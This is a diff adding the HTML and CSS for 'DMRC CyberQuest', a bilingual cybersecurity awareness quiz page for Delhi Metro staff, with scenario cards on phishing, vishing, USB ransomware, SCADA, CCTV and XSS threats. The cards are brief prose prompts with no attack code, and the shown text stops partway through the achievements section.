@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>DMRC CyberQuest – साइबर सुरक्षा जागरूकता</title>
+<style>
+  :root {
+    --blue:    #003f8a;
+    --light-blue: #0061c2;
+    --accent:  #e8002d;
+    --gold:    #f5a623;
+    --green:   #00843d;
+    --bg:      #0a0f1e;
+    --card-bg: #111827;
+    --card-border: #1e3a5f;
+    --text:    #e8edf5;
+    --subtext: #8ba3c4;
+    --success: #00d68f;
+    --danger:  #ff3d71;
+    --warning: #ffaa00;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', 'Noto Sans Devanagari', Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── HEADER ───────────────────────────────────────────── */
+  header {
+    background: linear-gradient(135deg, #001f4d 0%, #003f8a 50%, #001f4d 100%);
+    border-bottom: 3px solid var(--accent);
+    padding: 0;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    box-shadow: 0 4px 30px rgba(0,63,138,.6);
+  }
+
+  .header-inner {
+    max-width: 1200px;
+    margin: auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 24px;
+    gap: 16px;
+  }
+
+  .logo-area {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .dmrc-badge {
+    width: 56px; height: 56px;
+    background: linear-gradient(135deg, var(--accent), #a80020);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 900; color: #fff;
+    letter-spacing: .5px; text-align: center; line-height: 1.2;
+    border: 3px solid rgba(255,255,255,.25);
+    box-shadow: 0 0 20px rgba(232,0,45,.4);
+    flex-shrink: 0;
+  }
+
+  .title-block h1 {
+    font-size: 1.3rem; font-weight: 800; color: #fff;
+    letter-spacing: .5px;
+  }
+  .title-block p {
+    font-size: .75rem; color: #93c5fd; margin-top: 2px;
+  }
+
+  .header-right { display: flex; align-items: center; gap: 12px; }
+
+  .lang-toggle {
+    background: rgba(255,255,255,.1);
+    border: 1px solid rgba(255,255,255,.2);
+    border-radius: 30px;
+    padding: 6px 4px;
+    display: flex; gap: 4px;
+    cursor: pointer;
+  }
+  .lang-btn {
+    padding: 5px 14px; border-radius: 24px;
+    font-size: .8rem; font-weight: 700;
+    border: none; cursor: pointer; transition: all .25s;
+    background: transparent; color: #93c5fd;
+  }
+  .lang-btn.active {
+    background: var(--light-blue); color: #fff;
+    box-shadow: 0 2px 10px rgba(0,97,194,.5);
+  }
+
+  .score-pill {
+    background: rgba(0,214,143,.15);
+    border: 1px solid var(--success);
+    border-radius: 30px;
+    padding: 6px 16px;
+    font-size: .85rem; font-weight: 700;
+    color: var(--success);
+    display: flex; align-items: center; gap: 6px;
+  }
+
+  /* ── HERO ─────────────────────────────────────────────── */
+  .hero {
+    background: radial-gradient(ellipse at 50% 0%, rgba(0,63,138,.5) 0%, transparent 70%),
+                linear-gradient(180deg, #0d1b35 0%, var(--bg) 100%);
+    text-align: center;
+    padding: 60px 24px 40px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background-image:
+      repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(0,97,194,.05) 40px, rgba(0,97,194,.05) 41px),
+      repeating-linear-gradient(90deg, transparent, transparent 40px, rgba(0,97,194,.05) 40px, rgba(0,97,194,.05) 41px);
+    pointer-events: none;
+  }
+
+  .metro-line-bar {
+    display: flex; justify-content: center; gap: 6px;
+    margin-bottom: 24px;
+  }
+  .metro-dot {
+    width: 12px; height: 12px; border-radius: 50%;
+    animation: pulse-dot 2s infinite;
+  }
+  .metro-dot:nth-child(1) { background: #e8002d; animation-delay: 0s; }
+  .metro-dot:nth-child(2) { background: #f5a623; animation-delay: .2s; }
+  .metro-dot:nth-child(3) { background: #00843d; animation-delay: .4s; }
+  .metro-dot:nth-child(4) { background: #0061c2; animation-delay: .6s; }
+  .metro-dot:nth-child(5) { background: #9b59b6; animation-delay: .8s; }
+  .metro-dot:nth-child(6) { background: #1abc9c; animation-delay: 1s; }
+
+  @keyframes pulse-dot {
+    0%, 100% { transform: scale(1); opacity: .8; }
+    50% { transform: scale(1.4); opacity: 1; }
+  }
+
+  .hero h2 {
+    font-size: clamp(1.8rem, 4vw, 3rem);
+    font-weight: 900;
+    background: linear-gradient(135deg, #fff 30%, #93c5fd 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    margin-bottom: 8px;
+  }
+
+  .hero .subtitle {
+    font-size: clamp(.9rem, 2vw, 1.15rem);
+    color: var(--subtext);
+    max-width: 640px;
+    margin: 0 auto 28px;
+    line-height: 1.6;
+  }
+
+  .hero-stats {
+    display: flex; justify-content: center; gap: 32px;
+    flex-wrap: wrap;
+  }
+  .stat-item { text-align: center; }
+  .stat-num { font-size: 2rem; font-weight: 900; color: var(--gold); }
+  .stat-label { font-size: .75rem; color: var(--subtext); }
+
+  /* ── SCENARIO MAP / GRID ──────────────────────────────── */
+  .section-title {
+    text-align: center;
+    padding: 40px 24px 20px;
+  }
+  .section-title h3 {
+    font-size: 1.5rem; font-weight: 800;
+    color: #fff;
+  }
+  .section-title p { color: var(--subtext); margin-top: 6px; font-size: .9rem; }
+
+  .scenarios-grid {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 24px 60px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+    gap: 24px;
+  }
+
+  .scenario-card {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 16px;
+    padding: 24px;
+    cursor: pointer;
+    transition: all .3s;
+    position: relative;
+    overflow: hidden;
+  }
+  .scenario-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 3px;
+  }
+  .scenario-card:hover {
+    transform: translateY(-4px);
+    box-shadow: 0 12px 40px rgba(0,97,194,.3);
+    border-color: var(--light-blue);
+  }
+  .scenario-card.locked {
+    opacity: .5; cursor: not-allowed;
+  }
+  .scenario-card.completed::before { background: var(--success); }
+  .scenario-card.completed { border-color: rgba(0,214,143,.3); }
+
+  .card-header { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 14px; }
+
+  .card-icon {
+    width: 52px; height: 52px; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.6rem; flex-shrink: 0;
+  }
+
+  .card-meta h4 { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 4px; }
+  .card-meta .vendor-tag {
+    font-size: .7rem; font-weight: 600;
+    padding: 2px 8px; border-radius: 20px;
+    background: rgba(0,97,194,.3); color: #93c5fd;
+    display: inline-block;
+  }
+
+  .card-desc { font-size: .85rem; color: var(--subtext); line-height: 1.6; margin-bottom: 14px; }
+
+  .card-footer { display: flex; align-items: center; justify-content: space-between; }
+
+  .difficulty-badge {
+    font-size: .7rem; font-weight: 700;
+    padding: 3px 10px; border-radius: 20px;
+  }
+  .diff-easy   { background: rgba(0,214,143,.15); color: var(--success); border: 1px solid var(--success); }
+  .diff-medium { background: rgba(255,170,0,.15);  color: var(--warning); border: 1px solid var(--warning); }
+  .diff-hard   { background: rgba(255,61,113,.15); color: var(--danger);  border: 1px solid var(--danger); }
+
+  .pts-badge {
+    font-size: .8rem; font-weight: 700; color: var(--gold);
+  }
+
+  .completed-check {
+    position: absolute; top: 14px; right: 14px;
+    width: 28px; height: 28px; border-radius: 50%;
+    background: var(--success);
+    display: flex; align-items: center; justify-content: center;
+    font-size: .9rem; color: #fff;
+    display: none;
+  }
+  .scenario-card.completed .completed-check { display: flex; }
+
+  /* ── MODAL OVERLAY ────────────────────────────────────── */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,.85);
+    backdrop-filter: blur(6px);
+    z-index: 2000;
+    display: none;
+    align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  .modal-overlay.open { display: flex; }
+
+  .modal {
+    background: #0f1c35;
+    border: 1px solid var(--card-border);
+    border-radius: 20px;
+    max-width: 720px; width: 100%;
+    max-height: 90vh;
+    overflow-y: auto;
+    padding: 32px;
+    position: relative;
+    box-shadow: 0 30px 100px rgba(0,0,0,.7);
+    animation: modal-in .3s cubic-bezier(.34,1.56,.64,1);
+  }
+
+  @keyframes modal-in {
+    from { transform: scale(.92) translateY(20px); opacity: 0; }
+    to   { transform: scale(1)  translateY(0);     opacity: 1; }
+  }
+
+  .modal-close {
+    position: absolute; top: 16px; right: 16px;
+    background: rgba(255,255,255,.1); border: none;
+    color: #fff; width: 36px; height: 36px; border-radius: 50%;
+    font-size: 1.1rem; cursor: pointer; display: flex;
+    align-items: center; justify-content: center; transition: background .2s;
+  }
+  .modal-close:hover { background: rgba(255,61,113,.4); }
+
+  .modal-icon { font-size: 2.5rem; margin-bottom: 12px; }
+  .modal h3 { font-size: 1.4rem; font-weight: 800; margin-bottom: 6px; }
+  .modal .scenario-context {
+    background: rgba(0,97,194,.12);
+    border-left: 3px solid var(--light-blue);
+    border-radius: 0 10px 10px 0;
+    padding: 14px 16px;
+    margin: 16px 0;
+    font-size: .9rem; line-height: 1.7;
+    color: #c7d9f5;
+  }
+
+  .modal .scene-img {
+    width: 100%;
+    background: linear-gradient(135deg, #1a2744, #0f1c35);
+    border: 1px solid var(--card-border);
+    border-radius: 12px;
+    padding: 20px;
+    margin: 16px 0;
+    font-family: monospace;
+    font-size: .82rem;
+    color: #7dd3fc;
+    line-height: 1.8;
+    white-space: pre-wrap;
+  }
+
+  .question-block { margin-top: 20px; }
+  .question-block p {
+    font-size: 1rem; font-weight: 700;
+    margin-bottom: 14px; color: #fff;
+  }
+
+  .options { display: flex; flex-direction: column; gap: 10px; }
+
+  .option-btn {
+    background: rgba(255,255,255,.05);
+    border: 1px solid var(--card-border);
+    border-radius: 10px;
+    padding: 14px 16px;
+    color: var(--text);
+    font-size: .9rem;
+    cursor: pointer; text-align: left;
+    transition: all .2s;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .option-btn:hover:not(:disabled) {
+    background: rgba(0,97,194,.2);
+    border-color: var(--light-blue);
+    transform: translateX(4px);
+  }
+  .option-btn.correct {
+    background: rgba(0,214,143,.15);
+    border-color: var(--success);
+    color: var(--success);
+  }
+  .option-btn.wrong {
+    background: rgba(255,61,113,.15);
+    border-color: var(--danger);
+    color: var(--danger);
+  }
+  .option-btn:disabled { cursor: default; }
+
+  .option-letter {
+    width: 28px; height: 28px; border-radius: 50%;
+    background: rgba(255,255,255,.1);
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: .8rem; flex-shrink: 0;
+  }
+
+  .feedback-box {
+    margin-top: 16px;
+    padding: 16px;
+    border-radius: 12px;
+    font-size: .88rem; line-height: 1.7;
+    display: none;
+  }
+  .feedback-box.show { display: block; }
+  .feedback-box.correct-fb {
+    background: rgba(0,214,143,.12);
+    border: 1px solid var(--success);
+    color: #a7f3d0;
+  }
+  .feedback-box.wrong-fb {
+    background: rgba(255,61,113,.12);
+    border: 1px solid var(--danger);
+    color: #fca5a5;
+  }
+
+  .next-btn {
+    margin-top: 20px;
+    background: linear-gradient(135deg, var(--light-blue), var(--blue));
+    border: none; border-radius: 10px;
+    color: #fff; padding: 12px 28px;
+    font-size: .95rem; font-weight: 700;
+    cursor: pointer; width: 100%;
+    transition: all .2s; display: none;
+    box-shadow: 0 4px 20px rgba(0,97,194,.4);
+  }
+  .next-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,97,194,.6); }
+  .next-btn.show { display: block; }
+
+  /* ── PROGRESS BAR ─────────────────────────────────────── */
+  .progress-section {
+    max-width: 1200px; margin: 0 auto;
+    padding: 0 24px 40px;
+  }
+  .progress-label {
+    display: flex; justify-content: space-between;
+    font-size: .82rem; color: var(--subtext); margin-bottom: 8px;
+  }
+  .progress-bar-outer {
+    height: 8px; background: rgba(255,255,255,.08);
+    border-radius: 4px; overflow: hidden;
+  }
+  .progress-bar-inner {
+    height: 100%;
+    background: linear-gradient(90deg, var(--blue), var(--success));
+    border-radius: 4px;
+    transition: width .6s ease;
+  }
+
+  /* ── LEADERBOARD / BADGES ─────────────────────────────── */
+  .badges-section {
+    max-width: 1200px; margin: 0 auto;
+    padding: 0 24px 40px;
+  }
+  .badges-grid {
+    display: flex; flex-wrap: wrap; gap: 14px;
+    margin-top: 16px;
+  }
+  .badge-item {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 12px;
+    padding: 14px 18px;
+    display: flex; align-items: center; gap: 12px;
+    min-width: 200px; flex: 1;
+    opacity: .4;
+    transition: all .4s;
+  }
+  .badge-item.earned {
+    opacity: 1;
+    border-color: var(--gold);
+    box-shadow: 0 0 20px rgba(245,166,35,.2);
+  }
+  .badge-icon { font-size: 1.8rem; }
+  .badge-name { font-size: .82rem; font-weight: 700; color: #fff; }
+  .badge-desc { font-size: .72rem; color: var(--subtext); }
+
+  /* ── CERTIFICATE SECTION ──────────────────────────────── */
+  .cert-section {
+    max-width: 1200px; margin: 0 auto;
+    padding: 20px 24px 60px;
+    text-align: center;
+    display: none;
+  }
+  .cert-section.show { display: block; }
+  .cert-box {
+    background: linear-gradient(135deg, #0a1628, #001140);
+    border: 2px solid var(--gold);
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 600px; margin: 0 auto;
+    box-shadow: 0 0 60px rgba(245,166,35,.2);
+  }
+  .cert-box h2 { font-size: 1.6rem; color: var(--gold); margin-bottom: 8px; }
+
+  /* ── FOOTER ───────────────────────────────────────────── */
+  footer {
+    background: #050d1f;
+    border-top: 1px solid var(--card-border);
+    text-align: center;
+    padding: 24px;
+    font-size: .78rem;
+    color: var(--subtext);
+  }
+  footer span { color: var(--accent); }
+
+  /* ── RESULT MODAL ─────────────────────────────────────── */
+  .result-banner {
+    text-align: center; padding: 20px 0 10px;
+  }
+  .result-banner .big-icon { font-size: 4rem; }
+  .result-banner h3 { font-size: 1.5rem; font-weight: 900; margin: 10px 0 6px; }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: #0a0f1e; }
+  ::-webkit-scrollbar-thumb { background: #1e3a5f; border-radius: 4px; }
+
+  @media (max-width: 600px) {
+    .scenarios-grid { grid-template-columns: 1fr; }
+    .hero-stats { gap: 20px; }
+    .modal { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══ HEADER ══════════════════════════════════════════════ -->
+<header>
+  <div class="header-inner">
+    <div class="logo-area">
+      <div class="dmrc-badge">DMRC<br>साइबर</div>
+      <div class="title-block">
+        <h1>🛡️ CyberQuest <span style="color:#93c5fd">DMRC</span></h1>
+        <p class="en-text">Cybersecurity Awareness | Delhi Metro Rail Corporation</p>
+        <p class="hi-text" style="display:none">साइबर सुरक्षा जागरूकता | दिल्ली मेट्रो रेल कॉर्पोरेशन</p>
+      </div>
+    </div>
+    <div class="header-right">
+      <div class="lang-toggle">
+        <button class="lang-btn active" id="btnEn" onclick="setLang('en')">EN</button>
+        <button class="lang-btn" id="btnHi" onclick="setLang('hi')">हिंदी</button>
+      </div>
+      <div class="score-pill">⭐ <span id="scoreDisplay">0</span> pts</div>
+    </div>
+  </div>
+</header>
+
+<!-- ══ HERO ════════════════════════════════════════════════ -->
+<section class="hero">
+  <div class="metro-line-bar">
+    <div class="metro-dot"></div><div class="metro-dot"></div>
+    <div class="metro-dot"></div><div class="metro-dot"></div>
+    <div class="metro-dot"></div><div class="metro-dot"></div>
+  </div>
+  <h2 class="en-text">DMRC CyberQuest</h2>
+  <h2 class="hi-text" style="display:none">डीएमआरसी साइबर क्वेस्ट</h2>
+
+  <p class="subtitle en-text">
+    Real-world cyber scenarios based on DMRC's actual technology ecosystem.<br>
+    Train your instincts. Protect the Metro.
+  </p>
+  <p class="subtitle hi-text" style="display:none">
+    डीएमआरसी के वास्तविक प्रौद्योगिकी तंत्र पर आधारित साइबर परिदृश्य।<br>
+    अपनी प्रवृत्ति को प्रशिक्षित करें। मेट्रो की रक्षा करें।
+  </p>
+
+  <div class="hero-stats">
+    <div class="stat-item">
+      <div class="stat-num">8</div>
+      <div class="stat-label en-text">Scenarios</div>
+      <div class="stat-label hi-text" style="display:none">परिदृश्य</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">800</div>
+      <div class="stat-label en-text">Total Points</div>
+      <div class="stat-label hi-text" style="display:none">कुल अंक</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">6+</div>
+      <div class="stat-label en-text">Real Vendors Covered</div>
+      <div class="stat-label hi-text" style="display:none">विक्रेता शामिल</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">2</div>
+      <div class="stat-label en-text">Languages</div>
+      <div class="stat-label hi-text" style="display:none">भाषाएँ</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ PROGRESS ════════════════════════════════════════════ -->
+<div class="progress-section">
+  <div class="progress-label">
+    <span class="en-text">Your Progress</span>
+    <span class="hi-text" style="display:none">आपकी प्रगति</span>
+    <span><span id="completedCount">0</span>/8 <span class="en-text">completed</span><span class="hi-text" style="display:none">पूर्ण</span></span>
+  </div>
+  <div class="progress-bar-outer">
+    <div class="progress-bar-inner" id="progressBar" style="width:0%"></div>
+  </div>
+</div>
+
+<!-- ══ SCENARIOS TITLE ═════════════════════════════════════ -->
+<div class="section-title">
+  <h3 class="en-text">🚇 Choose Your Mission</h3>
+  <h3 class="hi-text" style="display:none">🚇 अपना मिशन चुनें</h3>
+  <p class="en-text">Each scenario is based on real threats to metro rail infrastructure</p>
+  <p class="hi-text" style="display:none">प्रत्येक परिदृश्य मेट्रो रेल बुनियादी ढांचे के वास्तविक खतरों पर आधारित है</p>
+</div>
+
+<!-- ══ SCENARIOS GRID ══════════════════════════════════════ -->
+<div class="scenarios-grid" id="scenariosGrid">
+
+  <!-- Scenario 1 -->
+  <div class="scenario-card" id="card-0" onclick="openScenario(0)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(232,0,45,.15);">🎣</div>
+      <div class="card-meta">
+        <h4 class="en-text">The Thales Phishing Trap</h4>
+        <h4 class="hi-text" style="display:none">थेल्स फिशिंग जाल</h4>
+        <span class="vendor-tag">Vendor: Thales AFC System</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">A DMRC IT officer receives an urgent email claiming to be from Thales support, asking for AFC system login credentials. Can you spot the trap?</p>
+    <p class="card-desc hi-text" style="display:none">एक डीएमआरसी आईटी अधिकारी को थेल्स सपोर्ट से एक अर्जेंट ईमेल मिलता है जो AFC सिस्टम क्रेडेंशियल मांगता है। क्या आप जाल पहचान सकते हैं?</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-easy en-text">Easy</span>
+      <span class="difficulty-badge diff-easy hi-text" style="display:none">आसान</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 2 -->
+  <div class="scenario-card" id="card-1" onclick="openScenario(1)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(245,166,35,.15);">💳</div>
+      <div class="card-meta">
+        <h4 class="en-text">Smart Card Exploit</h4>
+        <h4 class="hi-text" style="display:none">स्मार्ट कार्ड शोषण</h4>
+        <span class="vendor-tag">Vendor: NXP / Thales AFC</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">A passenger discovers a flaw in the NXP MiFare DESFire EV1 card system used by DMRC. What should happen next? (Based on a real 2022 vulnerability.)</p>
+    <p class="card-desc hi-text" style="display:none">एक यात्री को डीएमआरसी के NXP MiFare स्मार्ट कार्ड में खामी मिलती है। आगे क्या होना चाहिए? (2022 की वास्तविक भेद्यता पर आधारित।)</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-medium en-text">Medium</span>
+      <span class="difficulty-badge diff-medium hi-text" style="display:none">मध्यम</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 3 -->
+  <div class="scenario-card" id="card-2" onclick="openScenario(2)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(0,132,61,.15);">🚦</div>
+      <div class="card-meta">
+        <h4 class="en-text">SCADA Signaling Attack</h4>
+        <h4 class="hi-text" style="display:none">SCADA सिग्नलिंग हमला</h4>
+        <span class="vendor-tag">Vendor: Siemens / Alstom OT</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">An engineer notices unusual commands being sent to the Siemens SCADA train control system. IT-OT convergence has opened a new attack surface.</p>
+    <p class="card-desc hi-text" style="display:none">एक इंजीनियर Siemens SCADA ट्रेन नियंत्रण प्रणाली को असामान्य कमांड भेजते देखता है। IT-OT एकीकरण ने नया खतरा पैदा किया है।</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-hard en-text">Hard</span>
+      <span class="difficulty-badge diff-hard hi-text" style="display:none">कठिन</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 4 -->
+  <div class="scenario-card" id="card-3" onclick="openScenario(3)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(0,97,194,.2);">🤖</div>
+      <div class="card-meta">
+        <h4 class="en-text">Fake SAP Vendor Call</h4>
+        <h4 class="hi-text" style="display:none">नकली SAP विक्रेता कॉल</h4>
+        <span class="vendor-tag">Vendor: SAP ERP (DMRC)</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">Someone calls DMRC's finance team claiming to be SAP support needing remote access for an "emergency patch". Classic vishing attack.</p>
+    <p class="card-desc hi-text" style="display:none">कोई डीएमआरसी की वित्त टीम को SAP सपोर्ट बताकर "इमरजेंसी पैच" के लिए रिमोट एक्सेस मांगता है। क्लासिक विशिंग हमला।</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-easy en-text">Easy</span>
+      <span class="difficulty-badge diff-easy hi-text" style="display:none">आसान</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 5 -->
+  <div class="scenario-card" id="card-4" onclick="openScenario(4)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(255,61,113,.15);">💻</div>
+      <div class="card-meta">
+        <h4 class="en-text">Station PC Ransomware</h4>
+        <h4 class="hi-text" style="display:none">स्टेशन PC रैनसमवेयर</h4>
+        <span class="vendor-tag">Vendor: Cloudflare / Internal IT</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">A staff member plugs in a "lost" USB drive at Rajiv Chowk station. Within minutes, the ticketing terminal shows a ransom message.</p>
+    <p class="card-desc hi-text" style="display:none">एक कर्मचारी राजीव चौक स्टेशन पर एक "खोई हुई" USB लगाता है। कुछ मिनटों में टिकटिंग टर्मिनल पर फिरौती का संदेश दिखता है।</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-medium en-text">Medium</span>
+      <span class="difficulty-badge diff-medium hi-text" style="display:none">मध्यम</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 6 -->
+  <div class="scenario-card" id="card-5" onclick="openScenario(5)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(155,89,182,.15);">📷</div>
+      <div class="card-meta">
+        <h4 class="en-text">CCTV Network Hijack</h4>
+        <h4 class="hi-text" style="display:none">CCTV नेटवर्क अपहरण</h4>
+        <span class="vendor-tag">Vendor: DMRC Surveillance (14,600+ cams)</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">DMRC operates 14,600+ CCTV cameras. A security analyst spots traffic being mirrored to an unknown external IP. What's the right response?</p>
+    <p class="card-desc hi-text" style="display:none">डीएमआरसी के 14,600+ CCTV हैं। एक एनालिस्ट देखता है कि ट्राफिक किसी अज्ञात बाहरी IP पर भेजा जा रहा है। सही प्रतिक्रिया क्या है?</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-hard en-text">Hard</span>
+      <span class="difficulty-badge diff-hard hi-text" style="display:none">कठिन</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 7 -->
+  <div class="scenario-card" id="card-6" onclick="openScenario(6)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(26,188,156,.15);">🌐</div>
+      <div class="card-meta">
+        <h4 class="en-text">XSS Web Injection</h4>
+        <h4 class="hi-text" style="display:none">XSS वेब इंजेक्शन</h4>
+        <span class="vendor-tag">Vendor: DMRC Intranet (Real 2024 CVE)</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">A stored XSS vulnerability was found in DMRC's intranet user profile in 2024. A hacker has injected a script — can you identify the impact and mitigation?</p>
+    <p class="card-desc hi-text" style="display:none">2024 में DMRC इंट्रानेट प्रोफाइल में Stored XSS मिला था। हैकर ने स्क्रिप्ट इंजेक्ट की है — क्या आप इसका प्रभाव और समाधान पहचान सकते हैं?</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-medium en-text">Medium</span>
+      <span class="difficulty-badge diff-medium hi-text" style="display:none">मध्यम</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+  <!-- Scenario 8 -->
+  <div class="scenario-card" id="card-7" onclick="openScenario(7)">
+    <div class="completed-check">✓</div>
+    <div class="card-header">
+      <div class="card-icon" style="background:rgba(245,166,35,.15);">👤</div>
+      <div class="card-meta">
+        <h4 class="en-text">Vendor Portal Insider Threat</h4>
+        <h4 class="hi-text" style="display:none">विक्रेता पोर्टल आंतरिक खतरा</h4>
+        <span class="vendor-tag">Vendor: DMRC Vendor Payment Portal (VPP)</span>
+      </div>
+    </div>
+    <p class="card-desc en-text">A vendor employee with access to DMRC's VPP (vpp.dmrc.org) is exfiltrating payment data before leaving the organization. Insider threat in action.</p>
+    <p class="card-desc hi-text" style="display:none">VPP (vpp.dmrc.org) एक्सेस वाला विक्रेता कर्मचारी संगठन छोड़ने से पहले भुगतान डेटा चुरा रहा है। आंतरिक खतरे को पहचानें।</p>
+    <div class="card-footer">
+      <span class="difficulty-badge diff-hard en-text">Hard</span>
+      <span class="difficulty-badge diff-hard hi-text" style="display:none">कठिन</span>
+      <span class="pts-badge">⭐ 100 pts</span>
+    </div>
+  </div>
+
+</div><!-- /scenarios-grid -->
+
+<!-- ══ BADGES ══════════════════════════════════════════════ -->
+<div class="badges-section">
+  <div class="section-title" style="padding-top:0; text-align:left; padding-left:0; padding-right:0;">
+    <h3 class="en-text" style="font-size:1.2rem;">🏅 Achievements</h3>
+    <h3 class="hi-text" style="font-size:1.2rem; display:none;">🏅 उपलब्धियाँ</h3>
+  </div>
+  <div class="badges-grid">
+    <div class="badge-item" id="badge-0">
+      <div class="badge-icon">🎣</div>
+      <div>
+        <div class="badge-name en-text">Phish Detector</div>
+        <div class="badge-name hi-text" style="display:none;">फिश डिटेक्टर</div>
+        <div class="badge-desc en-text">Spotted the fake Thales email</div>
+        <div class="badge-desc hi-text" style="display:none;">नकली थेल्स ईमेल पहचाना</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-1">
+      <div class="badge-icon">💳</div>
+      <div>
+        <div class="badge-name en-text">Card Guardian</div>
+        <div class="badge-name hi-text" style="display:none;">कार्ड गार्डियन</div>
+        <div class="badge-desc en-text">Handled the NXP smart card bug</div>
+        <div class="badge-desc hi-text" style="display:none;">NXP स्मार्ट कार्ड बग संभाला</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-2">
+      <div class="badge-icon">🚦</div>
+      <div>
+        <div class="badge-name en-text">OT Defender</div>
+        <div class="badge-name hi-text" style="display:none;">OT रक्षक</div>
+        <div class="badge-desc en-text">Secured SCADA signaling</div>
+        <div class="badge-desc hi-text" style="display:none;">SCADA सिग्नलिंग सुरक्षित की</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-3">
+      <div class="badge-icon">📞</div>
+      <div>
+        <div class="badge-name en-text">Vishing Buster</div>
+        <div class="badge-name hi-text" style="display:none;">विशिंग बस्टर</div>
+        <div class="badge-desc en-text">Foiled the fake SAP call</div>
+        <div class="badge-desc hi-text" style="display:none;">नकली SAP कॉल नाकाम की</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-4">
+      <div class="badge-icon">🛡️</div>
+      <div>
+        <div class="badge-name en-text">USB Warrior</div>
+        <div class="badge-name hi-text" style="display:none;">USB योद्धा</div>
+        <div class="badge-desc en-text">Stopped the ransomware spread</div>
+        <div class="badge-desc hi-text" style="display:none;">रैनसमवेयर फैलने से रोका</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-5">
+      <div class="badge-icon">📡</div>
+      <div>
+        <div class="badge-name en-text">Eye of CCTV</div>
+        <div class="badge-name hi-text" style="display:none;">CCTV की आँख</div>
+        <div class="badge-desc en-text">Detected surveillance hijack</div>
+        <div class="badge-desc hi-text" style="display:none;">निगरानी अपहरण पकड़ा</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-6">
+      <div class="badge-icon">💉</div>
+      <div>
+        <div class="badge-name en-text">Script Stopper</div>
+        <div class="badge-name hi-text" style="display:none;">स्क्रिप्ट स्टॉपर</div>
+        <div class="badge-desc en-text">Mitigated the XSS injection</div>
+        <div class="badge-desc hi-text" style="display:none;">XSS इंजेक्शन रोका</div>
+      </div>
+    </div>
+    <div class="badge-item" id="badge-7">
+      <div class="badge-icon">🕵️</div>
+      <div>
+        <div class="badge-name en-text">Insider Hunter</div>
